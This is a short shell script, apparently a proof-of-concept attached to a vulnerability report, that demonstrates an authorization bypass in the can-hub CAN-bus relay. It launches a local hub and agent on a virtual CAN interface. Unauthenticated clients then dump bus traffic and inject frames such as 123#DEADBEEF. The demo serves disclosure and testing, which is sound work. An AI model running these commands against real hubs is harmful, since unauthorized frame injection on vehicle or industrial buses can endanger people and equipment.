#!/bin/sh
# can-hub F1 live demo — unauthenticated plaintext-transport read + inject.
# Requires: vcan0 (sudo modprobe vcan && sudo ip link add dev vcan0 type vcan && sudo ip link set vcan0 up)
# Built from can-hub-io/can-hub @ e7b3653. See REPORT-F1-PLAINTEXT-AUTHZ-BYPASS.md.
set -x
cd "$(dirname "$0")"
HUB=/home/box/canhub-hunt/build/can-hub
AGENT=/home/box/canhub-hunt/build/can-hub-agent
CLIENT=/home/box/canhub-hunt/build/can-hub-client

$HUB > hub.log 2>&1 & HUB_PID=$!
sleep 1
$AGENT --connect tcp://127.0.0.1:7228 --name demo vcan0 > agent.log 2>&1 & AGENT_PID=$!
sleep 2
# third client, zero credentials: read the bus
$CLIENT --connect tcp://127.0.0.1:7228 dump demo/vcan0 > dump.log 2>&1 & DUMP_PID=$!
sleep 1
# inject frames from a fourth, equally unauthenticated client
$CLIENT --connect tcp://127.0.0.1:7228 send demo/vcan0 123#DEADBEEF
$CLIENT --connect tcp://127.0.0.1:7228 send demo/vcan0 456#0011223344556677
sleep 1.5
kill $DUMP_PID
cat dump.log   # shows the injected frames round-tripping: sniff + inject confirmed
kill $AGENT_PID $HUB_PID